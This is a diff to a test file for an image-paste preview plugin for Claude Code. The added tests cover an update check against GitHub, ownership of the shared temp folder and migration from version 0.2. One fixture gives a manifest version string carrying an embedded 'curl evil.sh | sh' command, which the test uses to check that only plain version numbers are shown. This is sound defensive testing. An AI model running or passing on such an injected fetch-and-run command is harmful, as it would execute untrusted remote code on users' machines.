@@ -2,7 +2,7 @@ import { expect, mock, test } from 'claude-code/testing'
 import type { Engine } from 'claude-code/testing'
 import type { On } from 'claude-code'
 
-import { clipboardSteps, editorArgv, editsRoot, engineRoot, isMissing, join, LANGUAGE_PS, langOf, localeOf, osOf, sizeOf, sweepStep, thumbOf } from './platform'
+import { clipboardSteps, editorArgv, editsRoot, engineRoot, isMissing, isNewer, join, LANGUAGE_PS, langOf, localeOf, osOf, sizeOf, sweepStep, thumbOf } from './platform'
 import type { Lang, Os } from './platform'
 
 // The paste on each system, end to end inside the engine: "[Image #1]" lands in the box,
@@ -65,6 +65,8 @@ const SYSTEMS: Record<Os, System> = {
 
 type World = {
   runs: string[][]
+  fetches: string[]
+  stored: Map<string, unknown>
   runTimeouts: (number | undefined)[]
   // Commands and file writes, in the order the mod made them.
   acts: string[]
@@ -83,8 +85,8 @@ const canon = (path: string) => path.replace(/\\/g, '/').replace(/^.*?([A-Za-z]:
 
 // The system beneath the mod: its variables, its commands and its files. `copy` is where
 // Claude Code kept the paste (absent: it kept none); `say` what the editor prints.
-const world = (on: On, system: System, options: { copy?: boolean; say?: string; tools?: Record<string, Answer>; pasteSize?: number; spawnFails?: boolean; warmFails?: boolean; culture?: string; session?: () => string; hold?: Promise<void>; says?: string[]; holdSweep?: Promise<void>; fails?: string[] } = {}) => {
-  const w: World = { runs: [], runTimeouts: [], acts: [], runEnvs: [], spawns: [], toasts: [], files: new Map(), dirs: new Map(), context: [] }
+const world = (on: On, system: System, options: { copy?: boolean; say?: string; tools?: Record<string, Answer>; pasteSize?: number; spawnFails?: boolean; warmFails?: boolean; culture?: string; session?: () => string; hold?: Promise<void>; says?: string[]; holdSweep?: Promise<void>; fails?: string[]; version?: string; latest?: string; stored?: Record<string, unknown>; foreignRoot?: boolean; foreignOld?: boolean } = {}) => {
+  const w: World = { runs: [], fetches: [], stored: new Map(Object.entries(options.stored ?? {})), runTimeouts: [], acts: [], runEnvs: [], spawns: [], toasts: [], files: new Map(), dirs: new Map(), context: [] }
   const file = (path: string, size: number, bytes?: Uint8Array, text?: string) => w.files.set(canon(path), { path, size, bytes, text })
   // The warm panel's requests, as the mod writes them, for the panel below to take.
   const requests: { id: string; text: string }[] = []
@@ -115,8 +117,14 @@ const world = (on: On, system: System, options: { copy?: boolean; say?: string; 
     const line = argv.join(' ')
     if (options.fails?.includes(line)) return { deny: `ENOENT: ${argv[0]}` }
     if (line === 'touch' || argv[0] === 'touch') return { value: { exitCode: 0, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
+    // Whether the working folder is the user's own: find prints it where it is. Another
+    // account's (`foreignRoot`) prints nothing, and a folder of its own is made instead.
+    // The folder 0.2 kept its edits in on macOS: whose it is.
+    if (argv[0] === 'find' && argv.includes('-user') && !argv.includes('-perm')) return { value: { exitCode: 0, stdout: options.foreignOld ? '' : `${argv[1]}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
+    if (argv[0] === 'find' && argv.includes('-perm')) return { value: { exitCode: 0, stdout: options.foreignRoot ? '' : `${argv[1]}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
+    if (argv[0] === 'mktemp') return { value: { exitCode: 0, stdout: `${(argv.at(-1) ?? '').replace(/X+$/, 'Ab12Cd')}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
     // The week-old sweep, answered when the test lets it be.
-    if ((argv[0] === 'find' || argv.some(a => a.includes('Get-ChildItem'))) && options.holdSweep !== undefined) {
+    if ((argv.includes('-mtime') || argv.some(a => a.includes('Get-ChildItem'))) && options.holdSweep !== undefined) {
       await options.holdSweep
       w.acts.push('swept')
     }
@@ -166,6 +174,8 @@ const world = (on: On, system: System, options: { copy?: boolean; say?: string; 
     return { value: { kind: 'size' in found ? ('file' as const) : ('dir' as const), size, mtimeMs: 1, isLink: false, ...(e.resolve ? { realPath: found.path } : {}) } }
   })
   on('fs.read', ($, e) => {
+    // The mod's own manifest, for its version.
+    if (canon(e.path).endsWith('/.claude-plugin/plugin.json')) return { value: JSON.stringify({ name: 'paste-preview', version: options.version ?? '0.3.0' }) }
     const bytes = w.files.get(canon(e.path))?.bytes
     return bytes === undefined ? { deny: `ENOENT: ${e.path}` } : { value: { base64: base64(bytes) } }
   })
@@ -191,17 +201,42 @@ const world = (on: On, system: System, options: { copy?: boolean; say?: string; 
   // The prompt box, which the mod reads twice a second from the session's start.
   const box = { text: '' }
   on('prompt.read', () => ({ value: { text: box.text, cursor: box.text.length } }))
+  on('prompt.edit', ($, e) => {
+    box.text = e.text.slice(0, e.start) + e.inputText + e.text.slice(e.end)
+    return { text: box.text, cursor: e.start + e.inputText.length }
+  })
   on('session.start', ($, e) => ({ cwd: e.cwd }))
   on('session.end', ($, e) => ({ sessionId: e.sessionId }))
-  on('prompt.change', ($, e) => ({ text: e.text }))
+  // GitHub's copy of the manifest (`latest` its version, 'down' no answer), and the store
+  // that outlives the session.
+  on('http.fetch', ($, e) => {
+    w.fetches.push(e.url)
+    if (options.latest === undefined || options.latest === 'down') return { deny: 'getaddrinfo ENOTFOUND' }
+    if (options.latest === '404') return { value: { status: 404, ok: false, headers: {}, text: '404: Not Found' } }
+    return { value: { status: 200, ok: true, headers: {}, text: options.latest.startsWith('{') ? options.latest : JSON.stringify({ name: 'paste-preview', version: options.latest }) } }
+  })
+  on('store.get', ($, e) => ({ value: w.stored.get(e.key) }))
+  on('store.set', ($, e) => {
+    w.stored.set(e.key, e.value)
+    return { value: undefined }
+  })
   return { w, pasted, box, dir, file, project, sep }
 }
 
-// prompt.edit is the engine's alone to raise; the mod also reads the box on a timer,
-// which a test can drive: the session starts, then "[Image #1]" is in the box.
+// The mod reads the box on a timer, which a test can drive: the session starts, then
+// "[Image #1]" is in the box.
 const paste = async ($: Engine, box: { text: string }) => {
   await $.session.start({ cwd: '/home/me/project', surface: 'terminal', isInteractive: true })
   box.text = '[Image #1] '
+}
+
+// Text put in the box as the person's editor puts it there (a key, a paste): the edit
+// raised as the engine raises it. Its typings list only the prompt events a test usually
+// raises; the kit raises this one too, on every Claude Code the mod supports.
+const typeIn = ($: Engine, box: { text: string }, inputText: string) => {
+  const raise = $.prompt as unknown as { edit: (e: { origin: { kind: 'composer' }; text: string; cursor: number; start: number; end: number; inputText: string }) => Promise<unknown> }
+  const at = box.text.length
+  return raise.edit({ origin: { kind: 'composer' }, text: box.text, cursor: at, start: at, end: at, inputText })
 }
 
 // Lets the work the paste started run on: waits on the mocked clock, then the event loop.
@@ -583,15 +618,11 @@ test('linux: a number used again in the next conversation is not given the last 
 })
 
 // Issue #6 as reported: a resumed session whose start never reached the mod. The first
-// change of the box starts it, and the half-second look follows from there.
+// edit of the box (the paste itself) starts it, and the half-second look follows.
 test('linux: with no session.start, the first change of the box starts the mod', async ($, on) => {
   const clock = mock.clock(on)
   const { w, box, pasted, dir, file, sep } = world(on, SYSTEMS.linux)
-  box.text = '[Image #1] '
-  // The kit raises prompt.change as the engine does, though its typings list only the
-  // prompt events a test usually raises.
-  const raise = $.prompt as unknown as { change: (e: { text: string; cursor: number; origin: { kind: 'engine' } }) => Promise<unknown> }
-  await raise.change({ text: box.text, cursor: box.text.length, origin: { kind: 'engine' } })
+  await typeIn($, box, '[Image #1] ')
   await until(clock, () => asked(w).length > 0)
   expect(asked(w)[0]?.picture).toBe(pasted)
   const images = pasted.slice(0, pasted.lastIndexOf(sep))
@@ -628,7 +659,7 @@ test('the week-old sweep is given ten seconds at most', async ($, on) => {
   const { w, box } = world(on, SYSTEMS.linux)
   await paste($, box)
   await until(clock, () => asked(w).length > 0)
-  const at = w.runs.findIndex(argv => argv[0] === 'find')
+  const at = w.runs.findIndex(argv => argv.includes('-mtime'))
   expect(at).toBeGreaterThanOrEqual(0)
   expect(w.runTimeouts[at]).toBe(10_000)
 })
@@ -702,9 +733,17 @@ test('a sent prompt reads only the pictures it names', async ($, on) => {
 
 // A conversation resumed after /clear or /resume shows its own sent prompts: a number
 // the process gave a picture in another conversation is not theirs to show.
+// What Claude Code draws for a row the mod leaves to it.
+const engineRow = (on: On) =>
+  on('ui.render', ($, e) => {
+    const { Text } = $.ui.resolve(e)
+    return <Text key="engine">engine</Text>
+  })
+
 test('a sent prompt of another conversation is not given this one\'s picture', async ($, on) => {
   const clock = mock.clock(on)
   let session = SESSION
+  engineRow(on)
   const { w, box } = world(on, SYSTEMS.linux, { session: () => session })
   await paste($, box)
   await until(clock, () => w.spawns.length > 0)
@@ -717,18 +756,21 @@ test('a sent prompt of another conversation is not given this one\'s picture', a
   await $.session.end({ reason: 'resume', sessionId: SESSION, resume: { id: SESSION } })
   const other = await $.ui.mount({ ...ROW, requestId: 'row-there', props: { ...ROW.props, text: '[Image #1] from that conversation' } })
   expect(await other.find({ type: 'Image' })).toBeUndefined()
+  expect(await other.find({ type: 'Text', text: 'engine' })).toBeDefined()
   await other.unmount()
 })
 
 // The full view (ctrl+o) is Claude Code's own row, pictures or not.
 test('a sent prompt keeps Claude Code\'s row in the full view', async ($, on) => {
   const clock = mock.clock(on)
+  engineRow(on)
   const { w, box } = world(on, SYSTEMS.linux)
   await paste($, box)
   await until(clock, () => w.spawns.length > 0)
   await until(clock, () => false)
   const row = await $.ui.mount({ ...ROW, requestId: 'row', props: { ...ROW.props, isExpanded: true } })
   expect(await row.find({ type: 'Image' })).toBeUndefined()
+  expect(await row.find({ type: 'Text', text: 'engine' })).toBeDefined()
   await row.unmount()
 })
 
@@ -739,9 +781,8 @@ test('linux: a paste seen by two looks at once opens one editor', async ($, on) 
   const { w, box } = world(on, SYSTEMS.linux)
   await $.session.start({ cwd: '/home/me/project', surface: 'terminal', isInteractive: true })
   await clock.advance(250)
-  box.text = '[Image #1] '
-  const raise = $.prompt as unknown as { change: (e: { text: string; cursor: number; origin: { kind: 'engine' } }) => Promise<unknown> }
-  await Promise.all([raise.change({ text: box.text, cursor: 1, origin: { kind: 'engine' } }), raise.change({ text: box.text, cursor: 1, origin: { kind: 'engine' } })])
+  // The paste, and a key typed straight after it, both seen before the first look ends.
+  await Promise.all([typeIn($, box, '[Image #1] '), typeIn($, box, '')])
   await until(clock, () => false)
   expect(asked(w)).toHaveLength(1)
 })
@@ -756,9 +797,8 @@ test('linux: a paste right after /clear opens one editor', async ($, on) => {
   await until(clock, () => asked(w).length > 0)
   await until(clock, () => false)
   session = OTHER
-  box.text = '[Image #2] '
-  const raise = $.prompt as unknown as { change: (e: { text: string; cursor: number; origin: { kind: 'engine' } }) => Promise<unknown> }
-  await raise.change({ text: box.text, cursor: 1, origin: { kind: 'engine' } })
+  box.text = ''
+  await typeIn($, box, '[Image #2] ')
   const images = `${project}${sep}${OTHER}${sep}images`
   dir(images, [])
   for (let i = 0; i < 30; i++) await clock.advance(25)
@@ -806,8 +846,8 @@ for (const os of ['mac', 'linux'] as const) {
   })
 }
 
-// A read of state that fails once (the host busy) does not lose the paste: the next look
-// picks it up.
+// A read of state that fails once (the host busy) does not lose the paste: it is looked
+// for all the same.
 test('linux: a paste whose state could not be read once is still picked up', async ($, on) => {
   const clock = mock.clock(on)
   let refused = 0
@@ -824,3 +864,225 @@ test('linux: a paste whose state could not be read once is still picked up', asy
   expect(refused).toBe(1)
   expect(asked(w)).toHaveLength(1)
 })
+
+// ——— a newer version ———
+//
+// Claude Code updates a plugin from a marketplace like this one only where the person has
+// turned on the marketplace's auto-update. So once a day the mod asks GitHub for its
+// manifest, and where a newer version is out says so, once, with where to update and how
+// to stay current.
+
+const LATEST = 'https://raw.githubusercontent.com/alan890104/claude-code-paste-preview/main/.claude-plugin/plugin.json'
+const DAY = 24 * 60 * 60 * 1000
+// The test's clock starts here, so what the store holds is read against it.
+const NOW = 1_800_000_000_000
+const startSession = ($: Engine, isInteractive = true) => $.session.start({ cwd: '/home/me/project', surface: isInteractive ? 'terminal' : null, isInteractive })
+const settle = async (clock: { advance: (ms: number) => Promise<void> }) => {
+  for (let i = 0; i < 40; i++) await clock.advance(250)
+}
+
+test('a newer version is told once, in the person\'s language, with where to update', async ($, on) => {
+  const clock = mock.clock(on, { now: NOW })
+  const { w } = world(on, { ...SYSTEMS.linux, env: { LANG: 'zh_TW.UTF-8' } }, { version: '0.3.0', latest: '0.4.0' })
+  await startSession($)
+  await settle(clock)
+  expect(w.fetches).toEqual([LATEST])
+  expect(w.toasts).toEqual(['paste-preview 0.4.0 已推出（你目前是 0.3.0）。到 /plugin 更新，並在那裡開啟自動更新，之後就會自動保持最新。'])
+  expect(w.stored.get('update')).toEqual({ at: NOW + 5000, told: '0.4.0' })
+})
+
+test('a version already told is not told again', async ($, on) => {
+  const clock = mock.clock(on, { now: NOW })
+  const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: '0.4.0', stored: { update: { at: NOW - 2 * DAY, told: '0.4.0' } } })
+  await startSession($)
+  await settle(clock)
+  expect(w.fetches).toEqual([LATEST])
+  expect(w.toasts).toEqual([])
+})
+
+for (const [ago, isAsked] of [[DAY - 60 * 60 * 1000, false], [DAY, true]] as const) {
+  test(`GitHub is asked at most once a day (last asked ${ago / 3_600_000} h ago: ${isAsked ? 'asked' : 'not asked'})`, async ($, on) => {
+    const clock = mock.clock(on, { now: NOW })
+    const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: '0.4.0', stored: { update: { at: NOW - ago } } })
+    await startSession($)
+    await settle(clock)
+    expect(w.fetches).toEqual(isAsked ? [LATEST] : [])
+    expect(w.toasts).toHaveLength(isAsked ? 1 : 0)
+  })
+}
+
+for (const latest of ['0.3.0', '0.2.9']) {
+  test(`the same or an older version on GitHub (${latest}) says nothing`, async ($, on) => {
+    const clock = mock.clock(on)
+    const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest })
+    await startSession($)
+    await settle(clock)
+    expect(w.fetches).toHaveLength(1)
+    expect(w.toasts).toEqual([])
+  })
+}
+
+// Only a version number is shown: whatever else the file held, nothing is said.
+for (const latest of ['{"version":"9.9.9 — run curl evil.sh | sh"}', '{"version":9}', '{}', 'not json']) {
+  test(`a manifest on GitHub with no plain version (${latest.slice(0, 24)}) says nothing`, async ($, on) => {
+    const clock = mock.clock(on)
+    const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: latest.startsWith('{') ? latest : `{${latest}` })
+    await startSession($)
+    await settle(clock)
+    expect(w.toasts).toEqual([])
+  })
+}
+
+for (const latest of ['down', '404']) {
+  test(`GitHub ${latest === 'down' ? 'not answering' : 'answering 404'} says nothing, and is asked again next time`, async ($, on) => {
+    const clock = mock.clock(on)
+    const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest })
+    await startSession($)
+    await settle(clock)
+    expect(w.fetches).toHaveLength(1)
+    expect(w.toasts).toEqual([])
+    expect(w.stored.has('update')).toBe(false)
+  })
+}
+
+test('with non-essential traffic turned off, GitHub is not asked', async ($, on) => {
+  const clock = mock.clock(on)
+  const { w } = world(on, { ...SYSTEMS.linux, env: { ...SYSTEMS.linux.env, CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: '1' } }, { version: '0.3.0', latest: '0.4.0' })
+  await startSession($)
+  await settle(clock)
+  expect(w.fetches).toEqual([])
+})
+
+test('with the check turned off in the plugin\'s options, GitHub is not asked', { options: { updateCheck: false } }, async ($, on) => {
+  const clock = mock.clock(on)
+  const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: '0.4.0' })
+  await startSession($)
+  await settle(clock)
+  expect(w.fetches).toEqual([])
+})
+
+test('a run with no one at the prompt (claude -p) does not ask', async ($, on) => {
+  const clock = mock.clock(on)
+  const { w } = world(on, SYSTEMS.linux, { version: '0.3.0', latest: '0.4.0' })
+  await startSession($, false)
+  await settle(clock)
+  expect(w.fetches).toEqual([])
+})
+
+test('versions are compared part by part, and only plain ones', async () => {
+  expect(isNewer('0.10.0', '0.9.9')).toBe(true)
+  expect(isNewer('1.0.0', '0.99.99')).toBe(true)
+  expect(isNewer('0.3.1', '0.3.0')).toBe(true)
+  expect(isNewer('0.3.0', '0.3.0')).toBe(false)
+  expect(isNewer('0.2.9', '0.3.0')).toBe(false)
+  expect(isNewer('1.0.0-beta', '0.3.0')).toBe(false)
+  expect(isNewer('1.0', '0.3.0')).toBe(false)
+  expect(isNewer('0.4.0', '')).toBe(false)
+})
+
+// ——— the working folder belongs to the user ———
+//
+// mkdir -p accepts a folder that is already there, whoever made it. In a shared temp
+// folder another account could make the mod's first: then read the pictures put in it,
+// swap the edit Claude is pointed at, or (macOS) leave a panel binary that would be run.
+// A folder the user does not own alone (0700, theirs, not a link) is not used; a fresh
+// one of the mod's own is made instead.
+for (const os of ['mac', 'linux'] as const) {
+  test(`${os}: a working folder another account made first is not used`, async ($, on) => {
+    const clock = mock.clock(on)
+    const system = SYSTEMS[os]
+    const { w, box } = world(on, system, { foreignRoot: true })
+    await paste($, box)
+    await until(clock, () => asked(w).length > 0)
+    const root = system.edits.replace(/\/abcdef12$/, '')
+    expect(w.runs).toContainEqual(['find', root, '-maxdepth', '0', '-type', 'd', '-user', '501', '-perm', '700'])
+    const own = `${root}.Ab12Cd`
+    expect(asked(w)[0]?.out).toBe(`${own}/abcdef12/1.png`)
+    // Nothing of the other account's folder is run or written to after the check.
+    const checked = w.acts.findIndex(act => act.startsWith('run find') && act.includes('-perm'))
+    const into = (act: string) => act.includes(`${root}/`) || act.endsWith(` ${root}`)
+    expect(w.acts.slice(checked + 1).filter(into)).toEqual([])
+  })
+}
+
+// A paste whose picture could not be kept in state (the host busy) still opens one editor.
+test('linux: a paste whose state could not be written once opens one editor', async ($, on) => {
+  const clock = mock.clock(on)
+  let refused = 0
+  on('state.set', ($, e, next) => {
+    if (e.key === 'shot' && refused === 0) {
+      refused += 1
+      return { deny: 'the host is busy' }
+    }
+    return next(e)
+  })
+  // Its editor stays open through several half-second looks.
+  const hold = deferred()
+  const { w, box } = world(on, SYSTEMS.linux, { hold: hold.promise })
+  await paste($, box)
+  for (let i = 0; i < 12; i++) await clock.advance(250)
+  hold.release()
+  await until(clock, () => false)
+  expect(refused).toBe(1)
+  expect(asked(w)).toHaveLength(1)
+})
+
+// Edit opens the picture the band showed when it was pressed, whatever the number holds
+// by the time the editor before it closes.
+test('linux: Edit opens the picture the band showed', async ($, on) => {
+  const clock = mock.clock(on)
+  let session = SESSION
+  const hold = deferred()
+  const { w, box, pasted, dir, file, project, sep } = world(on, SYSTEMS.linux, { session: () => session, hold: hold.promise, says: ['CANCELLED', 'CANCELLED', 'CANCELLED'] })
+  await paste($, box)
+  await until(clock, () => asked(w).length > 0)
+  await until(clock, () => false)
+  const band = await $.ui.mount({ ...BAND })
+  await band.press({ key: 'edit-1' })
+  await band.unmount()
+  // The next conversation numbers a paste #1 too, while the first editor is still open.
+  const images = `${project}${sep}${OTHER}${sep}images`
+  dir(images, ['1.png'])
+  file(`${images}${sep}1.png`, 120_000, pngBytes(1200, 900))
+  session = OTHER
+  box.text = '[Image #1] '
+  await until(clock, () => false)
+  hold.release()
+  await until(clock, () => asked(w).length > 2)
+  expect(asked(w)[1]?.picture).toBe(pasted)
+})
+
+// ——— from 0.2 ———
+//
+// An update applied with /reload-plugins runs the new code in the same session, with the
+// state 0.2 kept: every paste in one list. The pastes in the box are carried over, so none
+// is taken for new (its editor opened again) and an edit made before still goes with it.
+test('linux: pastes kept by 0.2 in a session updated with /reload-plugins are carried over', async ($, on) => {
+  const clock = mock.clock(on)
+  const old = { n: 1, file: '/tmp/paste-preview-501/abcdef12/1.png', thumb: '/tmp/paste-preview-501/abcdef12/1.thumb.png', gen: 1, width: 1600, height: 900, isEdited: true, ratio: 16 / 9, isLarge: false }
+  on('state.get', ($, e, next) => (e.key === 'shots' ? { value: { value: [old], version: 3 } } : next(e)))
+  const { w, box } = world(on, SYSTEMS.linux)
+  await paste($, box)
+  await until(clock, () => false)
+  expect(asked(w)).toEqual([])
+  const band = await $.ui.mount({ ...BAND })
+  expect((await band.find({ type: 'Text', text: /^Image #1/ }))?.text).toBe('Image #1 edited')
+  await band.unmount()
+  await $.prompt.submit({ text: '[Image #1] what is this?', wait: false, origin: { kind: 'composer' } })
+  expect(w.context.some(note => note.includes('/tmp/paste-preview-501/abcdef12/1.png'))).toBe(true)
+})
+
+// 0.2 kept macOS edits in /private/tmp/paste-preview. Nothing new goes there; what it
+// holds is swept as before (folders a week old), where the folder is this user's.
+for (const isOwn of [true, false]) {
+  test(`mac: the folder 0.2 used is ${isOwn ? 'swept of week-old folders' : 'left alone where it is another account\'s'}`, async ($, on) => {
+    const clock = mock.clock(on)
+    const { w, box } = world(on, SYSTEMS.mac, { foreignOld: !isOwn })
+    await paste($, box)
+    await until(clock, () => asked(w).length > 0)
+    expect(w.runs).toContainEqual(['find', '/private/tmp/paste-preview', '-maxdepth', '0', '-type', 'd', '-user', '501'])
+    const swept = w.runs.filter(argv => argv[1] === '/private/tmp/paste-preview' && argv.includes('-mtime'))
+    expect(swept).toEqual(isOwn ? [['find', '/private/tmp/paste-preview', '-mindepth', '1', '-maxdepth', '1', '-mtime', '+7', '-exec', 'rm', '-rf', '{}', '+']] : [])
+  })
+}
+
